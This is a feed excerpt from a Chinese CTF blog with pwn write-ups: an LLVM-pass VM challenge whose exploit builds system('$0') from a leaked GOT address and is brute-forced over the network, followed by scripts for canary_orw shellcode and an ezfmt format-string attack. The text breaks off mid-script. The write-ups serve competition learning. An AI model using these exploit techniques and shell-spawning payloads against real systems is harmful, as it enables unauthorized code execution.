llvm::Pass::releaseMemory(void).data.rel.ro:0000000000030D68                 dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(void const*).data.rel.ro:0000000000030D70                 dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(void).data.rel.ro:0000000000030D78                 dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(void).data.rel.ro:0000000000030D80                 dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(void).data.rel.ro:0000000000030D88                 dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint).data.rel.ro:0000000000030D90                 dq offset _ZN12_GLOBAL__N_110c0oo0o0Ode13runOnFunctionERN4llvm8FunctionE ; &#96;anonymous namespace&#39;::c0oo0o0Ode::runOnFunction(llvm::Function &amp;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="确定函数名和类名编写交互脚本"><a href="#确定函数名和类名编写交互脚本" class="headerlink" title="确定函数名和类名编写交互脚本"></a>确定函数名和类名编写交互脚本</h4><p>找到程序逻辑，其中<code>llvm::Value::getName</code>用于获取函数名，<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>用于比较函数名</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall &#96;anonymous namespace&#39;::c0oo0o0Ode::runOnFunction(        _anonymous_namespace_::c0oo0o0Ode *this,        llvm::Function *a2)&#123;  __int64 v2; &#x2F;&#x2F; rdx  char v4; &#x2F;&#x2F; [rsp+Fh] [rbp-51h]  _BYTE v5[32]; &#x2F;&#x2F; [rsp+10h] [rbp-50h] BYREF  __int64 v6[2]; &#x2F;&#x2F; [rsp+30h] [rbp-30h] BYREF  __int64 Name; &#x2F;&#x2F; [rsp+40h] [rbp-20h]  __int64 v8; &#x2F;&#x2F; [rsp+48h] [rbp-18h]  llvm::Value *v9; &#x2F;&#x2F; [rsp+50h] [rbp-10h]  _anonymous_namespace_::c0oo0o0Ode *v10; &#x2F;&#x2F; [rsp+58h] [rbp-8h]  v10 &#x3D; this;  v9 &#x3D; a2;  secret::init(this);  Name &#x3D; llvm::Value::getName(a2);  v8 &#x3D; v2;  VMDatProt::getStrFromProt2(    (__int64)v5,    (__int64)&amp;&#96;anonymous namespace&#39;::vmFuncName[abi:cxx11],    (__int64)&amp;secret::vmKey[abi:cxx11]);  llvm::StringRef::StringRef(v6, v5);  v4 &#x3D; llvm::operator&#x3D;&#x3D;(Name, v8, v6[0], v6[1]);  std::string::~string(v5);  if ( (v4 &amp; 1) !&#x3D; 0 )    &#96;anonymous namespace&#39;::c0oo0o0Ode::vmRun(this, v9);  return 0LL;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接随便写一个函数名动态调试，传入参数的指令是<code>set args -load codeVM.so -Co00o0oOd3 exp.ll -f</code>，运行完初始化函数之后通过<code>vmmap</code>找到<code>codeVM.so</code>的基址</p><pre class="line-numbers language-none"><code class="language-none">0x7ffff1f88000     0x7ffff1fa0000 r--p    18000      0 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fa0000     0x7ffff1fb0000 r-xp    10000  18000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fb0000     0x7ffff1fb8000 r--p     8000  28000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fb8000     0x7ffff1fb9000 r--p     1000  2f000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fb9000     0x7ffff1fbb000 rw-p     2000  30000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>下断点观察函数名，测试程序中我的函数名是<code>testname</code>，在比较时输入的函数名变成了<code>_Z8testnamev</code>，即头部+长度+函数名+<code>v</code>，比较对象函数名<code>_Z10c0deVmMainv</code>，所以入口函数的函数名就是<code>c0deVmMain</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">► 0x7ffff1fa3242 &lt;(anonymous namespace)::c0oo0o0Ode::runOnFunction(llvm::Function&amp;)+98&gt;     call   llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt                &lt;llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt&gt;        rdi: 0x4e5510 ◂— &#39;_Z8testnamev&#39;        rsi: 0xc        rdx: 0x7fffffffd390 ◂— &#39;_Z10c0deVmMainv&#39;        rcx: 0xf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序的基本结构如下，其他操作都写在<code>c0deVmMain</code>中</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int c0deVmMain() &#123;        return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过比较之后会进入&#96;&#96;anonymous namespace’::c0oo0o0Ode::vmRun(this, v9);<code>，这个函数中存在</code>8<code>个</code>op<code>，在每个</code>op<code>之前通过</code>anonymous namespace’::c0oo0o0Ode::isValidOp(this, &amp;v15, v6) &amp; 1) !&#x3D; 0<code>判定函数名是否符合，同样函数中存在</code>llvm::Value::getName(v12)<code>和</code>llvm::operator&#x3D;&#x3D;(Name, v11, v9[0], v9[1], v4, v5);&#96;，也是任意写一个函数定位到这里判断函数名</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall &#96;anonymous namespace&#39;::c0oo0o0Ode::isValidOp(__int64 a1, __int64 a2, __int64 a3)&#123;  __int64 v3; &#x2F;&#x2F; rdx  __int64 v4; &#x2F;&#x2F; r8  __int64 v5; &#x2F;&#x2F; r9  char v7; &#x2F;&#x2F; [rsp+Fh] [rbp-81h]  _BYTE v8[32]; &#x2F;&#x2F; [rsp+18h] [rbp-78h] BYREF  __int64 v9[2]; &#x2F;&#x2F; [rsp+38h] [rbp-58h] BYREF  __int64 Name; &#x2F;&#x2F; [rsp+48h] [rbp-48h]  __int64 v11; &#x2F;&#x2F; [rsp+50h] [rbp-40h]  llvm::Value *v12; &#x2F;&#x2F; [rsp+58h] [rbp-38h]  __int64 CalledOperand; &#x2F;&#x2F; [rsp+60h] [rbp-30h]  llvm::CallBase *v14; &#x2F;&#x2F; [rsp+68h] [rbp-28h]  __int64 v15; &#x2F;&#x2F; [rsp+70h] [rbp-20h]  __int64 v16; &#x2F;&#x2F; [rsp+78h] [rbp-18h]  __int64 v17; &#x2F;&#x2F; [rsp+80h] [rbp-10h]  char v18; &#x2F;&#x2F; [rsp+8Fh] [rbp-1h]  v17 &#x3D; a1;  v16 &#x3D; a2;  v15 &#x3D; a3;  v14 &#x3D; (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;&gt;(a2);  if ( !v14 )    goto LABEL_6;  CalledOperand &#x3D; llvm::CallBase::getCalledOperand(v14);  v12 &#x3D; (llvm::Value *)llvm::dyn_cast&lt;llvm::Function,llvm::Value&gt;(CalledOperand);  if ( !v12 )    goto LABEL_6;  Name &#x3D; llvm::Value::getName(v12);  v11 &#x3D; v3;  VMDatProt::getStrFromProt2((__int64)v8, v15, (__int64)&amp;secret::vmKey[abi:cxx11]);  llvm::StringRef::StringRef(v9, (__int64)v8);  v7 &#x3D; llvm::operator&#x3D;&#x3D;(Name, v11, v9[0], v9[1], v4, v5);  std::string::~string(v8);  if ( (v7 &amp; 1) !&#x3D; 0 &amp;&amp; (&#96;anonymous namespace&#39;::c0oo0o0Ode::isValidEnv(a1, v16) &amp; 1) !&#x3D; 0 )    v18 &#x3D; 1;  elseLABEL_6:    v18 &#x3D; 0;  return v18 &amp; 1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我的测试函数名是<code>testfunction</code>，运行到断点观察输入函数名变成<code>_Z12testfunctionv</code>，而比较函数名<code>_ZN4edoc4addiEhii</code>，根据<code>c++</code>函数名修饰规则可以分析到该函数是位于<code>edoc</code>类下的<code>addi</code>函数，参数类型是<code>unsigned char</code>、<code>int</code>、<code>int</code> </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">► 0x7ffff1fa362e &lt;(anonymous namespace)::c0oo0o0Ode::isValidOp(llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, false, false, void&gt;, false, true&gt;&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;)+158&gt;    call   llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt                &lt;llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt&gt;        rdi: 0x4e55e0 ◂— &#39;_Z12testfunctionv&#39;        rsi: 0x11        rdx: 0x4ce0c0 ◂— &#39;_ZN4edoc4addiEhii&#39;        rcx: 0x11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样，运行到每个<code>op</code>前的&#96;&#96;anonymous namespace’::c0oo0o0Ode::isValidOp&#96;函数记录每个函数的函数名，得到以下交互脚本</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class edoc &#123;public:    void addi(unsigned char x, int y, int z) &#123;&#125;      void chgr(unsigned char x, int y) &#123;&#125;                      void sftr(unsigned char x, bool y, unsigned char z) &#123;&#125;           void borr(unsigned char x, unsigned char y, unsigned char z) &#123;&#125;     void movr(unsigned char x, unsigned char y) &#123;&#125;                     void save(unsigned char x, unsigned int  y) &#123;&#125;                  void load(unsigned char x, unsigned int y) &#123;&#125;                  void runc(unsigned char x, unsigned int  y) &#123;&#125;                &#125;;edoc obj;int c0deVmMain() &#123;        return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>对每个功能进行逆向分析，分析过程不多描述，分析结果如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">addi -&gt; regs[x] &#x3D; y + z                                   ;x &lt;&#x3D; 5chgr -&gt; regs[x] +&#x3D; y                                    ;x &lt;&#x3D; 5                  -0x1000 &lt; y &lt; 0x1000    onetimesftr -&gt; if y &#x3D;&#x3D; 1 : regs[x] &lt;&lt; z, if y &#x3D;&#x3D; 0 : regs[x] &gt;&gt; z      ;x &lt;&#x3D; 5  y &lt; 0x40borr -&gt; regs[x] &#x3D; regs[y] | regs[z]                        ;x &lt;&#x3D; 5  y &lt;&#x3D; 5  z &lt;&#x3D; 5movr -&gt; regs[x] &#x3D; regs[y]                                  ;x &lt; 8  y &lt; 8save -&gt; *(y+regs[6]) &#x3D; regs[x]                             ;x &lt;&#x3D; 5  y &lt;&#x3D; 0x1000     y &amp; 7 &#x3D;&#x3D; 0      regs[6] &amp; 0xFFF &#x3D; 0     regs[7] &#x3D; regs[6] + 0x1000load -&gt; regs[x] &#x3D; *(y+regs[6])                             ;x &lt;&#x3D; 5  y &lt;&#x3D; 0x1000     y &amp; 7 &#x3D;&#x3D; 0      regs[6] &amp; 0xFFF &#x3D; 0     regs[7] &#x3D; regs[6] + 0x1000runc -&gt; *(y+regs[6])(regs[x])                              ;x &lt;&#x3D; 5  y &lt;&#x3D; 0x1000     y &amp; 7 &#x3D;&#x3D; 0      regs[6] &amp; 0xFFF &#x3D; 0     regs[7] &#x3D; regs[6] + 0x1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用思路就是用<code>op7</code>获取一个<code>libc</code>上的地址，用<code>op8</code>执行<code>system(&#39;$0&#39;)</code>，<code>opt-12</code>程序没有开启<code>pie</code>，所以可以直接获取<code>opt-12</code>中的<code>got</code>表里的<code>libc</code>地址，离<code>system</code>最近的就是<code>0x442ad8</code>中的<code>getenv_got</code>，再通过左移右移或运算得到<code>system</code>地址，本地<code>getenv</code>和<code>system</code>地址如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/gx 0x442ad80x442ad8 <span class="token operator">&lt;</span>getenv@got<span class="token punctuation">[</span>plt<span class="token punctuation">]</span><span class="token operator">></span>:0x00007ffff1c44b70pwndbg<span class="token operator">></span> p system<span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">></span><span class="token punctuation">&#125;</span> 0x7ffff1c50d70 <span class="token operator">&lt;</span>system<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我的思路是将<code>getenv</code>右移<code>16</code>位再左移<code>16</code>位清空最后两个字节为<code>0x00007ffff1c40000</code>，第五位使用<code>op2</code>来加<code>1</code>为<code>0x00007ffff1c50000</code>，再用<code>op3</code>改末三位为<code>0x00007ffff1c50d70</code>，由于<code>libc</code>只有末三位固定剩下是随机的，所以第四位需要爆破</p><p>exp</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class edoc &#123;public:    void addi(unsigned char x, int y, int z) &#123;&#125;                                     void chgr(unsigned char x, int y) &#123;&#125;    void sftr(unsigned char x, bool y, unsigned char z) &#123;&#125;    void borr(unsigned char x, unsigned char y, unsigned char z) &#123;&#125;     void movr(unsigned char x, unsigned char y) &#123;&#125;     void save(unsigned char x, unsigned int  y) &#123;&#125;     void load(unsigned char x, unsigned int y) &#123;&#125;     void runc(unsigned char x, unsigned int  y) &#123;&#125;  &#125;;edoc obj;void testfunction()&#123;&#125;int c0deVmMain() &#123;        obj.addi(0, 0x442000, 0);        obj.movr(6, 0);        obj.addi(1, 0x443000, 0);        obj.movr(7, 1);&#x2F;&#x2F;regs[7] &#x3D; regs[6] + 0x1000        obj.load(2, 0xad8);    &#x2F;&#x2F;load(0x4420xad8): regs[2] &#x3D; getenv_addr        obj.sftr(2, 0, 16);                             obj.sftr(2, 1, 12);        obj.addi(5, 0x400, 0);        obj.borr(2, 2, 5);        obj.chgr(2, 0xc00);        obj.sftr(2, 1, 4);&#x2F;&#x2F;Sets the lower two bytes to null and increments the third last byte by 1        obj.addi(4, 0xd70, 0);        obj.borr(2, 2, 4);&#x2F;&#x2F;clear and add            obj.addi(4, 0x3024, 0);        obj.save(4, 0x1000);&#x2F;&#x2F;save $0        obj.save(2, 0xb00);&#x2F;&#x2F;save system        obj.runc(1, 0xb00);&#x2F;&#x2F;system(&#39;$0&#39;)        return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆破脚本，大概30+次爆破出来的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"exp.ll"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">+=</span> <span class="token string">b'\nEOF\n'</span>rnd <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">43319</span><span class="token punctuation">)</span>        rnd <span class="token operator">+=</span> <span class="token number">1</span>        li<span class="token punctuation">(</span><span class="token string">'the '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rnd<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' round'</span><span class="token punctuation">)</span>        r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'(EOF to stop):\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat flag'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            s <span class="token operator">=</span> r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'YLCTF'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>            li<span class="token punctuation">(</span>s<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://www.z1r0.top/2022/10/28/LLVM-PASS-PWN/">https://www.z1r0.top/2022/10/28/LLVM-PASS-PWN/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近比赛中遇到一道&lt;code&gt;llvm pass pwn&lt;/code&gt;，现学了一下相关知识，发现网上的讲解和例题的&lt;code&gt;exp&lt;/co</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="llvm" scheme="https://starrysky1004.github.io/tags/llvm/"/>
    
  </entry>
  
  <entry>
    <title>2024源鲁杯pwn方向题解</title>
    <link href="https://starrysky1004.github.io/2024/10/25/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/"/>
    <id>https://starrysky1004.github.io/2024/10/25/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/</id>
    <published>2024-10-25T08:41:16.000Z</published>
    <updated>2024-10-25T09:07:17.938Z</updated>
    
    <content type="html"><![CDATA[<h2 id="round1"><a href="#round1" class="headerlink" title="round1"></a>round1</h2><h3 id="canary-orw"><a href="#canary-orw" class="headerlink" title="canary_orw"></a>canary_orw</h3><p>再次运行到<code>vuln</code>使得<code>rsp</code>增加，最后<code>jmp rsp</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">46543</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token number">0x400821</span>pop_rbp_ret <span class="token operator">=</span> <span class="token number">0x40081E</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x40081B</span>check <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x601100</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x601100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'journey'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Sea'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'magic'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x40086D</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'go'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'magic'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'go'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'magic'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'go'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token number">0x30</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezfmt"><a href="#ezfmt" class="headerlink" title="ezfmt"></a>ezfmt</h3><p>改<code>put_got</code>为<code>ogg</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">39131</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token 